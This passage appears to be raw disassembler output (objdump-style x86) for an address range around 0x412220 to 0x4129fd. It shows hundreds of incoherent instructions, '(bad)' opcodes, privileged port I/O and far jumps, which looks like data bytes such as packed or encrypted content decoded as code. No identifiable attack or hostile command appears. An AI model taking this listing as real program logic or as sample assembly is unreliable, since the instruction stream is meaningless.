  41221a:	sub    bl,BYTE PTR [ecx+0x781ae89a]
  412220:	mov    esp,0xa4be0116
  412225:	retf   
  412226:	dec    esi
  412227:	push   edi
  412228:	rcl    BYTE PTR ds:0x14449313,cl
  41222e:	cmp    esi,DWORD PTR [ebx+esi*1-0x2e]
  412232:	xchg   edi,eax
  412233:	lods   eax,DWORD PTR ds:[esi]
  412234:	fild   DWORD PTR [edx+0x5]
  412237:	int    0x9
  412239:	ficomp DWORD PTR ds:0xcf13d8e1
  41223f:	and    dl,ah
  412241:	mov    edx,0xdcf675f9
  412246:	add    al,0x30
  412248:	xchg   ecx,eax
  412249:	out    0xcc,al
  41224b:	pop    ecx
  41224c:	xchg   ebx,eax
  41224d:	fisttp QWORD PTR [ebx-0x511feabb]
  412253:	mov    edx,0x32e417ca
  412258:	mul    BYTE PTR [ebx+0x686d23e7]
  41225e:	daa    
  41225f:	xchg   esi,eax
  412260:	push   ss
  412261:	jno    0x4122bd
  412263:	into   
  412264:	dec    ebp
  412265:	out    dx,al
  412266:	push   DWORD PTR [edi+0x1eb119d2]
  41226c:	pop    esi
  41226d:	sti    
  41226e:	mov    eax,ds:0xa4d6ebae
  412273:	jbe    0x4122f0
  412275:	test   DWORD PTR [esi],ebp
  412277:	sbb    eax,DWORD PTR [esi]
  412279:	push   esp
  41227a:	(bad)  
  41227b:	dec    edx
  41227c:	shl    DWORD PTR [edi+0x72802404],0xcf
  412283:	in     eax,0x72
  412285:	mov    esi,0x248ffb5c
  41228a:	sbb    dh,BYTE PTR ds:0x88897e99
  412290:	fmul   DWORD PTR [ebp+0x5f]
  412293:	fild   QWORD PTR [ebx]
  412295:	push   eax
  412296:	stc    
  412297:	ins    DWORD PTR es:[edi],dx
  412298:	push   edi
  412299:	ja     0x41226b
  41229b:	mov    bh,0x93
  41229d:	jmp    0x30239360
  4122a2:	mov    ebx,0x7871df2e
  4122a7:	in     al,dx
  4122a8:	leave  
  4122a9:	ds rcr cl,0x51
  4122ad:	xchg   ebx,eax
  4122ae:	cld    
  4122af:	repz mov bh,0xf7
  4122b2:	and    DWORD PTR [ecx],esi
  4122b4:	jns    0x412304
  4122b6:	arpl   WORD PTR [ebx],di
  4122b8:	cwde   
  4122b9:	or     edi,DWORD PTR [ebp+0x4]
  4122bc:	mov    ds:0x4f1617dc,al
  4122c1:	fidivr DWORD PTR [ebx+eiz*1+0x1df66421]
  4122c8:	pushf  
  4122c9:	clc    
  4122ca:	jb     0x4122f9
  4122cc:	xor    al,0x24
  4122ce:	push   esi
  4122cf:	(bad)  
  4122d0:	and    eax,0x7e4d4a9e
  4122d5:	mov    ebp,fs
  4122d7:	lea    ecx,[ebx+eiz*8-0x3c]
  4122db:	test   DWORD PTR ds:[eax],0x2f74418f
  4122e2:	ss icebp 
  4122e4:	pop    esp
  4122e5:	es sbb al,0x65
  4122e8:	inc    ebx
  4122e9:	mov    ds:0x6a7911e0,al
  4122ee:	cmp    DWORD PTR [eax+0xb75e3d3],0xca93e399
  4122f8:	cmp    ecx,esi
  4122fa:	jmp    0x412309
  4122fc:	sti    
  4122fd:	mov    ds:0x30c2002f,eax
  412302:	fninit 
  412304:	mov    ah,bl
  412306:	popa   
  412307:	jnp    0x412297
  412309:	mov    edi,0xff46c94
  41230e:	inc    ebp
  41230f:	cmp    eax,DWORD PTR [ebp-0x7a432c05]
  412315:	mov    ebx,eax
  412317:	das    
  412318:	ficom  DWORD PTR [ebx-0x14]
  41231b:	jo     0x4122ca
  41231d:	sbb    DWORD PTR [edx-0x7ef61b54],edx
  412323:	inc    ecx
  412324:	mov    DWORD PTR [ecx+eiz*2+0x50],edi
  412328:	jmp    0xc13:0x52f0511f
  41232f:	mov    edi,0x61e90f62
  412334:	inc    ebp
  412335:	inc    eax
  412336:	xchg   esp,eax
  412337:	imul   ecx,edi,0x18080a3c
  41233d:	cs mov edx,0x9895a024
  412343:	out    dx,eax
  412344:	loopne 0x412351
  412346:	push   edx
  412347:	(bad)  
  412348:	lahf   
  412349:	mov    ds:0xf468d1b,eax
  41234e:	push   ss
  41234f:	mov    ebp,0xd97e1898
  412354:	ss inc esi
  412356:	ds enter 0x8df9,0x93
  41235b:	mov    esi,DWORD PTR [edi]
  41235d:	leave  
  41235e:	inc    ecx
  41235f:	pop    eax
  412360:	pop    eax
  412361:	mov    al,BYTE PTR [edi+0x2d]
  412364:	push   es
  412365:	cmp    DWORD PTR [esi-0xa],edx
  412368:	xchg   ecx,eax
  412369:	pop    es
  41236a:	push   ss
  41236b:	add    dl,bl
  41236d:	sar    ebp,0xb4
  412370:	(bad)  
  412371:	fmul   st,st(1)
  412373:	mov    al,ds:0xc756f6e4
  412378:	int3   
  412379:	adc    eax,0xcc36e80c
  41237e:	aad    0xfe
  412380:	push   esp
  412381:	mov    ds:0x1c7d0874,eax
  412386:	add    eax,0x1d4b4480
  41238b:	js     0x4123a5
  41238d:	mov    bh,0x63
  41238f:	popa   
  412390:	repnz push 0xffffffcc
  412393:	mov    ds:0x421edf21,eax
  412398:	icebp  
  412399:	jae    0x4123da
  41239b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41239c:	leave  
  41239d:	imul   ebp,DWORD PTR [edx],0xa
  4123a0:	sub    DWORD PTR [esi+edi*2],edi
  4123a3:	imul   esp,DWORD PTR [edx+0x22c792d4],0x48
  4123aa:	cmp    BYTE PTR [ecx+0x4a3b4afb],ch
  4123b0:	call   0x2769:0xfa2bd583
  4123b7:	scas   al,BYTE PTR es:[edi]
  4123b8:	pop    ebx
  4123b9:	daa    
  4123ba:	mov    dh,0x6e
  4123bc:	lock fwait
  4123be:	pop    ebx
  4123bf:	(bad)  
  4123c0:	pop    edx
  4123c1:	arpl   WORD PTR [esi],sp
  4123c3:	lods   eax,DWORD PTR ds:[esi]
  4123c4:	xor    ch,al
  4123c6:	inc    eax
  4123c7:	sub    ch,BYTE PTR [ebp-0x3902befc]
  4123cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123ce:	xor    BYTE PTR [ebp-0x40f9e419],dh
  4123d4:	push   esi
  4123d5:	push   esi
  4123d6:	xchg   edx,eax
  4123d7:	dec    edi
  4123d8:	dec    esp
  4123d9:	sbb    DWORD PTR [edx-0x51],ebx
  4123dc:	bound  edx,QWORD PTR [edi-0x40]
  4123df:	aaa    
  4123e0:	imul   ecx,DWORD PTR [edi],0x1e4ff151
  4123e6:	addr16 mov eax,ds:0x3e6
  4123ea:	cmp    DWORD PTR [esi],eax
  4123ec:	jp     0x4123c8
  4123ee:	test   eax,0x76f19d0b
  4123f3:	mov    ah,BYTE PTR [edi-0xa]
  4123f6:	in     al,0x43
  4123f8:	(bad)  
  4123fa:	jecxz  0x4123b7
  4123fc:	xor    eax,0xa185a8e4
  412401:	aad    0xec
  412403:	sbb    eax,0x628a126c
  412408:	dec    ebx
  412409:	dec    esp
  41240a:	add    eax,0x1543a286
  41240f:	mov    eax,0x8c49c41b
  412414:	sar    ah,0x17
  412417:	push   ds
  412418:	xor    BYTE PTR [ecx-0x2f0e94dc],al
  41241e:	and    BYTE PTR [edi+0x11],al
  412421:	ret    0x5567
  412424:	aad    0x79
  412426:	dec    eax
  412427:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412428:	dec    eax
  412429:	jb     0x41247c
  41242b:	or     DWORD PTR [ecx+0x20159ec5],ebx
  412431:	in     al,0x9a
  412433:	jo     0x4123f4
  412435:	mov    cs,WORD PTR [eax]
  412437:	jnp    0x412471
  412439:	push   edi
  41243a:	loop   0x4124ba
  41243c:	fdiv   DWORD PTR [edi]
  41243e:	push   edi
  41243f:	dec    ebp
  412440:	xchg   ebx,eax
  412441:	imul   esp,DWORD PTR [ebx-0x76fe98df],0x19fd711d
  41244b:	inc    esi
  41244c:	sub    al,0xaa
  41244e:	scas   eax,DWORD PTR es:[edi]
  41244f:	scas   eax,DWORD PTR es:[edi]
  412450:	jne    0x412450
  412452:	mov    bl,0xe2
  412454:	(bad)  
  412455:	pop    esp
  412456:	push   0x31708898
  41245b:	(bad)  
  41245c:	and    dl,ch
  41245e:	sar    BYTE PTR [esi-0x671c202d],cl
  412464:	xchg   BYTE PTR [eax],bl
  412466:	pop    edx
  412467:	xchg   esp,esi
  412469:	popa   
  41246a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41246b:	(bad)  
  41246c:	pop    ss
  41246d:	leave  
  41246e:	sbb    DWORD PTR [eax+0x8],esp
  412471:	sub    cl,BYTE PTR [ebp-0x65ec525f]
  412477:	inc    ebx
  412478:	adc    BYTE PTR [edx+eiz*4-0x13],ch
  41247c:	adc    DWORD PTR [eax],0xaf481410
  412482:	xchg   edi,eax
  412483:	mov    bh,0x3b
  412485:	pop    ds
  412486:	or     ecx,ebp
  412488:	fldenv [esi]
  41248a:	enter  0x302e,0x17
  41248e:	fnstenv [edi+0x75204874]
  412494:	mov    ah,0xef
  412496:	sahf   
  412497:	mov    ah,0xae
  412499:	out    0x82,al
  41249b:	arpl   WORD PTR [ebx],di
  41249d:	push   ebp
  41249e:	cmp    al,0x98
  4124a0:	ss aas 
  4124a2:	sti    
  4124a3:	inc    ebp
  4124a4:	popf   
  4124a5:	js     0x41245a
  4124a7:	push   eax
  4124a8:	js     0x4124f2
  4124aa:	lea    esp,[edi]
  4124ac:	push   0x42
  4124ae:	mov    DWORD PTR [esi+ebp*2-0x2a],eax
  4124b2:	cmp    DWORD PTR [ebx+esi*8],ebx
  4124b5:	mov    WORD PTR gs:[eax+0x37],?
  4124b9:	aad    0x26
  4124bb:	and    BYTE PTR [esi+edi*8],al
  4124be:	sar    DWORD PTR [esp+edi*2-0xe6e4a6b],cl
  4124c5:	jle    0x412463
  4124c7:	sbb    dh,BYTE PTR [esi]
  4124c9:	cmp    eax,DWORD PTR [edi]
  4124cb:	lea    esi,[edx]
  4124cd:	jl     0x412500
  4124cf:	and    eax,0xe8d848cd
  4124d4:	jmp    0x4124f2
  4124d6:	aas    
  4124d7:	fisttp WORD PTR [esi+0xbf4ed02]
  4124dd:	sub    esp,esp
  4124df:	dec    edi
  4124e0:	inc    edx
  4124e1:	test   DWORD PTR [ebp+0x125dc6dd],ecx
  4124e7:	mov    al,0x7a
  4124e9:	or     BYTE PTR ds:0x722795c,dl
  4124ef:	mov    ds:0xe69b49eb,al
  4124f4:	pop    edx
  4124f5:	ins    DWORD PTR es:[edi],dx
  4124f6:	sub    ch,0x17
  4124f9:	sub    eax,DWORD PTR [ecx+0xbf89f83]
  4124ff:	test   ecx,edi
  412501:	das    
  412502:	repz jg 0x41251d
  412505:	jge    0x412522
  412507:	dec    edx
  412508:	stos   DWORD PTR es:[edi],eax
  412509:	mov    WORD PTR [esi+0x72],ss
  41250c:	or     ch,BYTE PTR [edx+ebp*4-0x6e]
  412510:	ins    DWORD PTR es:[edi],dx
  412511:	aam    0x50
  412513:	xchg   edx,eax
  412514:	(bad)  
  412515:	call   0xce6a76fe
  41251a:	mov    ecx,0xfe773f13
  41251f:	mov    eax,ds:0xdbde66fd
  412524:	mov    eax,ds:0xe44d8b9b
  412529:	mov    cl,0xe4
  41252b:	mov    ebx,0xda41781b
  412530:	inc    ebx
  412531:	and    DWORD PTR [edi],edx
  412533:	loop   0x4125a2
  412535:	inc    ebx
  412536:	stos   DWORD PTR es:[edi],eax
  412537:	repnz (bad)
  41253a:	mov    bh,0xc4
  41253c:	mov    ds:0xfa9c7278,eax
  412541:	jecxz  0x412544
  412543:	pop    ss
  412544:	int    0x63
  412546:	icebp  
  412547:	push   ds
  412548:	or     bl,dl
  41254a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41254b:	mov    dl,0xd0
  41254d:	mov    bl,0x2b
  41254f:	cmp    eax,DWORD PTR [edx-0x23]
  412552:	outs   dx,DWORD PTR ds:[esi]
  412553:	adc    esi,ebx
  412555:	inc    esp
  412556:	inc    eax
  412557:	mov    es,WORD PTR [ebp+0x6a]
  41255a:	mov    edi,edx
  41255c:	jecxz  0x4125d1
  41255e:	lods   al,BYTE PTR ds:[esi]
  41255f:	dec    ecx
  412560:	jp     0x412529
  412562:	popa   
  412563:	sar    ebp,cl
  412565:	xchg   DWORD PTR [esp+eax*1-0x2e],ebp
  412569:	push   eax
  41256a:	pop    esi
  41256b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41256c:	aad    0x74
  41256e:	(bad)  
  412570:	out    0xd6,eax
  412572:	loopne 0x4125c8
  412574:	or     ah,BYTE PTR [eax]
  412576:	inc    edx
  412577:	arpl   WORD PTR [esp+edx*1-0x522d61cc],bp
  41257e:	jb     0x41255c
  412580:	xchg   esi,eax
  412581:	leave  
  412582:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412583:	data16 js 0x41254e
  412586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412587:	push   ebx
  412588:	retf   
  412589:	fst    DWORD PTR [esi+eiz*8]
  41258c:	or     ebp,DWORD PTR [edx-0x6b2ab9db]
  412592:	mov    edi,0xb44adb85
  412597:	pushf  
  412598:	mov    ds:0xa1fc7218,eax
  41259d:	cmp    al,0x47
  41259f:	sar    BYTE PTR [esi-0x2c],1
  4125a2:	inc    esi
  4125a3:	jmp    0xbeace1e4
  4125a8:	outs   dx,DWORD PTR ds:[esi]
  4125a9:	fstp   QWORD PTR [edi+0x780d54be]
  4125af:	or     edx,DWORD PTR [ebp-0x5e]
  4125b2:	ret    
  4125b3:	push   0xffffffdc
  4125b5:	xchg   DWORD PTR [eax-0x5d155992],esp
  4125bb:	pop    es
  4125bc:	add    al,0x30
  4125be:	push   ss
  4125bf:	pop    esp
  4125c0:	(bad)  
  4125c1:	sahf   
  4125c2:	and    ebp,DWORD PTR [edi-0x57]
  4125c5:	and    BYTE PTR [esi],0xf6
  4125c8:	pop    ebx
  4125c9:	call   0x3c9:0x918d40fb
  4125d0:	lahf   
  4125d1:	xchg   BYTE PTR [edx-0xbdabf41],dl
  4125d7:	mov    gs,WORD PTR [ebx+0x2c]
  4125da:	jo     0x412598
  4125dc:	pop    esi
  4125dd:	jge    0x41259e
  4125df:	js     0x4125bc
  4125e1:	cmp    al,0x87
  4125e3:	sub    ch,BYTE PTR [eax-0x577786e1]
  4125e9:	out    dx,al
  4125ea:	loope  0x412598
  4125ec:	adc    BYTE PTR [eax-0x64],0xc8
  4125f0:	retf   
  4125f1:	push   ebx
  4125f2:	adc    esi,DWORD PTR [ecx+0x0]
  4125f5:	mov    cs,WORD PTR [edi+eiz*2+0x4f]
  4125f9:	mov    ebx,0x99ab018d
  4125fe:	out    dx,eax
  4125ff:	pop    eax
  412600:	dec    ecx
  412601:	gs xchg ebp,eax
  412603:	out    0x2e,eax
  412605:	sub    BYTE PTR [edx+0x129faeaa],0x69
  41260c:	imul   eax,DWORD PTR cs:[esi],0xa780dcc2
  412613:	add    edx,DWORD PTR [edx]
  412615:	adc    ch,BYTE PTR [ecx+0x76bb624d]
  41261b:	add    edi,DWORD PTR [eax-0x3f]
  41261e:	or     eax,0xb8c6b857
  412623:	test   DWORD PTR [edi-0x57255c63],0x40ca7381
  41262d:	mov    dh,0xa0
  41262f:	pop    esp
  412630:	cmc    
  412631:	retf   0xfe25
  412634:	mov    ch,0xb6
  412636:	pop    edx
  412637:	or     al,BYTE PTR [ecx-0x2b]
  41263a:	fcom   QWORD PTR [esi+0x38356b85]
  412640:	adc    edi,DWORD PTR [ebx+0x4ed3bb5c]
  412646:	and    eax,0x6969d4db
  41264b:	je     0x41262d
  41264d:	and    al,BYTE PTR ds:0x5530165c
  412653:	stos   DWORD PTR es:[edi],eax
  412654:	stos   DWORD PTR es:[edi],eax
  412655:	add    ch,BYTE PTR [edx+0x2c]
  412658:	shl    DWORD PTR [ecx-0x3bfb8589],0x15
  41265f:	xlat   BYTE PTR ds:[ebx]
  412660:	jno    0x412663
  412662:	add    bh,ch
  412664:	and    al,0x13
  412666:	inc    ebx
  412667:	mov    cl,0xfd
  412669:	imul   ebp,DWORD PTR [ecx],0xba3a5aae
  41266f:	iret   
  412670:	clc    
  412671:	ret    0x2a52
  412674:	aaa    
  412675:	mov    ah,BYTE PTR [ecx-0x73]
  412678:	push   es
  412679:	sub    BYTE PTR [eax+ecx*2],ch
  41267c:	pop    edx
  41267d:	cs cli 
  41267f:	xchg   edi,eax
  412680:	pushf  
  412681:	fwait
  412682:	cld    
  412683:	enter  0x1705,0xb2
  412687:	jns    0x412675
  412689:	mov    WORD PTR [edi],ds
  41268b:	scas   al,BYTE PTR es:[edi]
  41268c:	icebp  
  41268d:	xchg   ecx,eax
  41268e:	and    BYTE PTR ds:0x711468c2,bh
  412694:	xchg   ebp,eax
  412695:	stos   DWORD PTR es:[edi],eax
  412696:	xor    eax,0x3e00fb5b
  41269b:	shl    BYTE PTR [edx],0x3d
  41269e:	rol    DWORD PTR [esi+0x1b],cl
  4126a1:	iret   
  4126a2:	mov    al,ds:0x726a3830
  4126a7:	sbb    edx,DWORD PTR [edx+0x307443b5]
  4126ad:	pop    ecx
  4126ae:	xor    al,0x4f
  4126b0:	ficom  DWORD PTR [edi+0x715fcb37]
  4126b6:	in     eax,dx
  4126b7:	xor    al,0x54
  4126b9:	push   ebx
  4126ba:	adc    eax,0x3f55a3a0
  4126bf:	addr16 in al,dx
  4126c1:	(bad)  
  4126c2:	jge    0x4126e8
  4126c4:	mov    dl,0x7e
  4126c6:	add    ch,BYTE PTR [edx]
  4126c8:	loop   0x41268e
  4126ca:	arpl   WORD PTR [ebx+0x3c],cx
  4126cd:	fild   DWORD PTR [edi*2-0x10abbab7]
  4126d4:	js     0x41270c
  4126d6:	call   0x56d7:0x907a95ab
  4126dd:	daa    
  4126de:	jmp    0x412737
  4126e0:	addr16 mov dh,0x67
  4126e3:	rol    BYTE PTR [ebp+0x68],cl
  4126e6:	clc    
  4126e7:	stos   BYTE PTR es:[edi],al
  4126e8:	xor    DWORD PTR [ebx],ebp
  4126ea:	cwde   
  4126eb:	mov    cl,0x51
  4126ed:	xor    al,0xeb
  4126ef:	or     BYTE PTR [eax+0xb],dh
  4126f2:	xchg   DWORD PTR [edx],ecx
  4126f4:	jno    0x412677
  4126f6:	div    DWORD PTR [edx+0x3a0edcf]
  4126fc:	pop    esp
  4126fd:	leave  
  4126fe:	push   esp
  4126ff:	xchg   edx,eax
  412700:	mov    bl,0x22
  412702:	cmp    ah,BYTE PTR [eax]
  412704:	xchg   ebp,eax
  412705:	(bad)  
  412706:	push   eax
  412707:	cmp    DWORD PTR [ecx+0x65],esi
  41270a:	inc    esi
  41270b:	test   BYTE PTR [esi-0x44],0x36
  41270f:	inc    ecx
  412710:	sbb    eax,0xd5540eff
  412715:	leave  
  412716:	push   edx
  412717:	mov    al,ds:0x8df5bd34
  41271c:	adc    ah,al
  41271e:	sahf   
  41271f:	cld    
  412720:	std    
  412721:	xchg   edx,eax
  412722:	and    DWORD PTR [ebx-0x17d11678],edx
  412728:	aas    
  412729:	cmp    DWORD PTR [ecx+0x76],esi
  41272c:	push   cs
  41272d:	cmp    al,0x4e
  41272f:	and    bh,dh
  412731:	push   ebx
  412732:	imul   ebp,DWORD PTR [edx-0x299c40ca],0x6a
  412739:	not    ah
  41273b:	fisub  DWORD PTR [ebx]
  41273d:	arpl   WORD PTR [edi-0x72fab20d],ax
  412743:	in     eax,0x7
  412745:	daa    
  412746:	lock mov bh,0x11
  412749:	push   edx
  41274a:	xor    al,0xb8
  41274c:	jmp    0xd435:0x14cd0c5d
  412753:	mov    ds:0x23272f40,al
  412758:	lds    esp,FWORD PTR [edi-0x27]
  41275b:	push   0xfffffffb
  41275d:	pop    ss
  41275e:	and    BYTE PTR [edx+ecx*2+0x36],al
  412762:	dec    esp
  412763:	cmp    cl,bh
  412765:	or     DWORD PTR [ecx],0x77
  412768:	or     dh,dh
  41276a:	xchg   esp,eax
  41276b:	lods   al,BYTE PTR ds:[esi]
  41276c:	jecxz  0x41275a
  41276e:	rcr    DWORD PTR [edi+0x4b],0xae
  412772:	rcl    BYTE PTR [ebp+0x38],cl
  412775:	jl     0x41274c
  412777:	(bad)  
  412778:	outs   dx,BYTE PTR ds:[esi]
  412779:	outs   dx,BYTE PTR ds:[esi]
  41277a:	loopne 0x412727
  41277c:	inc    ebx
  41277d:	je     0x412732
  41277f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412780:	and    al,0x8c
  412783:	and    BYTE PTR [eax+ebp*2],bl
  412786:	adc    BYTE PTR [ecx+0xc],ch
  412789:	jno    0x41271b
  41278b:	lock lea ecx,[ebp-0x1358d222]
  412792:	dec    edi
  412793:	cmp    esp,DWORD PTR [ebx]
  412795:	dec    BYTE PTR [eax-0x6a37a31d]
  41279b:	adc    bh,BYTE PTR [esi+0x44]
  41279e:	xchg   esi,eax
  41279f:	out    dx,al
  4127a0:	mov    edx,ebx
  4127a2:	push   ebx
  4127a3:	mov    al,0xe8
  4127a5:	mov    esi,esp
  4127a7:	mov    edi,0xc1eba8b4
  4127ac:	fs cli 
  4127ae:	xchg   ebx,eax
  4127af:	ficomp DWORD PTR [ebp+0x40e9fa4]
  4127b5:	stos   BYTE PTR es:[edi],al
  4127b6:	pop    esp
  4127b7:	(bad)  
  4127b8:	fisubr DWORD PTR [ebx+eax*1+0x7d6c43da]
  4127bf:	add    DWORD PTR [edx+0x5a],esi
  4127c2:	mov    ds:0xf5116eb1,al
  4127c7:	ret    
  4127c8:	std    
  4127c9:	or     ah,cl
  4127cb:	pushf  
  4127cc:	in     eax,0x29
  4127ce:	xchg   edi,eax
  4127cf:	ins    BYTE PTR es:[edi],dx
  4127d0:	sbb    DWORD PTR [edi-0x1c],0xffffffdd
  4127d4:	in     eax,0x9a
  4127d6:	outs   dx,DWORD PTR ds:[esi]
  4127d7:	jno    0x412776
  4127d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4127da:	mov    ds:0x7ea67a96,al
  4127df:	stc    
  4127e0:	xor    eax,0xfc92bcd5
  4127e5:	xor    dh,BYTE PTR [eax+eax*1+0x4ed33591]
  4127ec:	popa   
  4127ed:	and    ch,BYTE PTR [ecx+0x5bc5a737]
  4127f3:	mov    edx,0x14669e11
  4127f8:	dec    ebx
  4127f9:	sub    eax,0xc821c6bd
  4127fe:	in     eax,dx
  4127ff:	mov    ah,0x6d
  412801:	ror    DWORD PTR [ebx+ecx*1],1
  412804:	inc    esp
  412805:	inc    ecx
  412806:	pop    es
  412807:	pop    ebx
  412808:	je     0x412822
  41280a:	lock inc ecx
  41280c:	mov    eax,gs
  41280e:	mov    DWORD PTR [edi+0x1c0b0bb3],ebp
  412814:	(bad)  
  412815:	fld    DWORD PTR [ebx+0x4960e3cb]
  41281b:	or     eax,0x73eaa2cb
  412820:	stos   DWORD PTR es:[edi],eax
  412821:	jmp    0x6dfdb765
  412826:	xchg   ecx,eax
  412827:	ror    BYTE PTR [ecx+0xd6fc0de],0xa8
  41282e:	mov    ds:0xf7b3616c,eax
  412833:	add    bl,ah
  412835:	retf   0x8c0b
  412838:	bound  esp,QWORD PTR [esi]
  41283a:	not    bl
  41283c:	pushf  
  41283d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41283e:	sbb    BYTE PTR [edx],cl
  412840:	mov    edi,0x7649eca4
  412845:	adc    DWORD PTR [ebp+0x30],0x2206fb32
  41284c:	xchg   DWORD PTR [ebx+esi*1],ebx
  41284f:	mov    bl,0xbb
  412851:	mov    WORD PTR [ebx+ebp*1+0x662d9de8],cs
  412858:	popa   
  412859:	mov    bh,0x78
  41285b:	jge    0x412881
  41285d:	js     0x41284d
  41285f:	test   al,0x46
  412861:	sub    BYTE PTR [edi+0x456060c4],al
  412867:	out    0x82,eax
  412869:	es scas eax,DWORD PTR es:[edi]
  41286b:	sbb    edx,DWORD PTR [eax]
  41286d:	sbb    BYTE PTR [edi],dl
  41286f:	dec    ebx
  412870:	repnz test DWORD PTR [ebp-0x2b254f11],esi
  412877:	mov    ch,0xf5
  412879:	mov    al,0x49
  41287b:	add    al,0x13
  41287d:	je     0x41289b
  41287f:	sbb    eax,0x7671038c
  412884:	xor    ch,BYTE PTR [eax+0x11]
  412887:	arpl   WORD PTR [ebx+0x2d],ax
  41288a:	cwde   
  41288b:	das    
  41288c:	cld    
  41288d:	add    DWORD PTR [edi-0x32],edx
  412890:	out    0xf0,eax
  412892:	jne    0x4128f3
  412894:	fst    QWORD PTR [ebx+0x46]
  412897:	cmp    BYTE PTR [ebx+0x14],bh
  41289a:	shr    DWORD PTR [esi-0x63],0x3
  41289e:	cmp    eax,0x6945a194
  4128a3:	outs   dx,BYTE PTR ds:[si]
  4128a6:	sbb    dl,BYTE PTR [ebp-0x6791ec6d]
  4128ac:	test   DWORD PTR [edi-0x6e],ecx
  4128af:	adc    al,0x2c
  4128b1:	outs   dx,BYTE PTR ds:[esi]
  4128b2:	jnp    0x41292d
  4128b4:	rcl    DWORD PTR [esi+0x18947204],cl
  4128ba:	push   cs
  4128bb:	js     0x4128f0
  4128bd:	repz popa 
  4128bf:	imul   ecx,DWORD PTR [ebp+0x130e1743],0xffffff82
  4128c6:	gs mov ch,0xe2
  4128c9:	pop    ecx
  4128ca:	mov    ?,WORD PTR [esp+ebx*2]
  4128cd:	jp     0x41289d
  4128cf:	(bad)  
  4128d1:	mov    dl,0x94
  4128d3:	and    BYTE PTR ds:0xa2b072ab,ch
  4128d9:	inc    eax
  4128da:	cli    
  4128db:	jnp    0x412916
  4128dd:	and    al,al
  4128df:	inc    edx
  4128e0:	xchg   ebx,eax
  4128e1:	daa    
  4128e2:	shr    ecx,cl
  4128e4:	pop    esi
  4128e5:	push   ss
  4128e6:	pop    esi
  4128e7:	jnp    0x4128b8
  4128e9:	shr    BYTE PTR [eax],1
  4128eb:	mov    DWORD PTR [esi+0x48],0x5016a73a
  4128f2:	jp     0x412881
  4128f4:	xchg   esi,eax
  4128f5:	sbb    dl,BYTE PTR [edx]
  4128f7:	pop    esp
  4128f8:	jo     0x41295f
  4128fa:	jg     0x41296f
  4128fc:	mov    DWORD PTR [edi],0x5e2367ac
  412902:	mov    bl,0xa2
  412904:	and    DWORD PTR [edi],eax
  412906:	scas   eax,DWORD PTR es:[edi]
  412907:	mov    BYTE PTR [ebx-0x43],bh
  41290a:	pop    es
  41290b:	adc    eax,0xebdd0f3e
  412910:	cli    
  412911:	and    ebx,ebx
  412913:	inc    ch
  412915:	daa    
  412916:	repz xor BYTE PTR [edi+0x222f5d0a],ch
  41291d:	inc    esi
  41291e:	xlat   BYTE PTR ds:[ebx]
  41291f:	lds    eax,FWORD PTR [ebp-0x56]
  412922:	(bad)  [ebp-0x74]
  412925:	aam    0xf5
  412927:	push   ds
  412928:	fisttp WORD PTR [esi+0x6]
  41292b:	aam    0x11
  41292d:	jmp    0xe2f6:0x61a50e2b
  412934:	jns    0x412977
  412936:	dec    edi
  412937:	pop    es
  412938:	std    
  412939:	sub    eax,0xc722699b
  41293e:	cmp    al,0x53
  412940:	addr16 es pop ss
  412943:	dec    esi
  412944:	fistp  DWORD PTR [edi+eiz*4+0x51]
  412948:	adc    edi,esp
  41294a:	and    bl,BYTE PTR [eax-0x18]
  41294d:	(bad)  
  41294f:	add    eax,0x68b7c800
  412954:	xor    eax,0xc20c501e
  412959:	dec    esp
  41295a:	push   esp
  41295b:	loop   0x4129d0
  41295d:	jecxz  0x41294e
  41295f:	repz adc dh,BYTE PTR [edx-0x765c97b5]
  412966:	les    ebx,FWORD PTR es:[eax-0x170a3bc1]
  41296d:	or     eax,0x34fa11fa
  412972:	pop    edi
  412973:	xor    al,dh
  412975:	pop    ecx
  412976:	ror    DWORD PTR [ecx-0x695e19ef],cl
  41297c:	mov    bh,0xe7
  41297e:	xor    BYTE PTR [ecx-0x3f5f2f36],0x2a
  412985:	push   ss
  412986:	or     DWORD PTR [edx],eax
  412988:	cmp    al,0x7a
  41298a:	push   ebx
  41298b:	cmc    
  41298c:	lea    ecx,[esi-0x798ca394]
  412992:	lods   eax,DWORD PTR ds:[esi]
  412993:	(bad)  
  412994:	(bad)  
  412995:	jo     0x4129c0
  412997:	out    0x30,al
  412999:	xchg   ebp,eax
  41299a:	dec    ecx
  41299b:	xor    esi,esp
  41299d:	jmp    0x6372b3fe
  4129a2:	push   esp
  4129a3:	jmp    0xb41b:0x4fa14cf2
  4129aa:	fs cld 
  4129ac:	mov    edx,0x1253bfe3
  4129b1:	test   DWORD PTR [ebp+0x3e],0xb30644f2
  4129b8:	fwait
  4129b9:	cmp    eax,ecx
  4129bb:	sbb    DWORD PTR [eax-0xf],esp
  4129be:	inc    eax
  4129bf:	jmp    0x41298d
  4129c1:	sub    cl,BYTE PTR [edi+0x41ada763]
  4129c7:	sbb    ebp,esp
  4129c9:	jo     0x4129bb
  4129cb:	xlat   BYTE PTR ds:[ebx]
  4129cc:	(bad)  
  4129cd:	in     eax,dx
  4129ce:	leave  
  4129cf:	mov    dl,0x3
  4129d1:	mov    ebp,0x462c0e9d
  4129d6:	push   ebp
  4129d7:	mov    al,BYTE PTR [ebx]
  4129d9:	iret   
  4129da:	test   dl,ah
  4129dc:	inc    eax
  4129dd:	push   edx
  4129de:	inc    esp
  4129df:	aad    0xcd
  4129e1:	in     al,0xca
  4129e3:	mov    esi,0x66384569
  4129e8:	popf   
  4129e9:	dec    esi
  4129ea:	pop    es
  4129eb:	mov    ebp,0x596857dc
  4129f0:	enter  0xb38d,0x10
  4129f4:	cli    
  4129f5:	cwde   
  4129f6:	dec    ebp
  4129f7:	je     0x412a11
  4129f9:	(bad)  
  4129fa:	sub    bl,cl
  4129fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129fd:	jae    0x4129f0
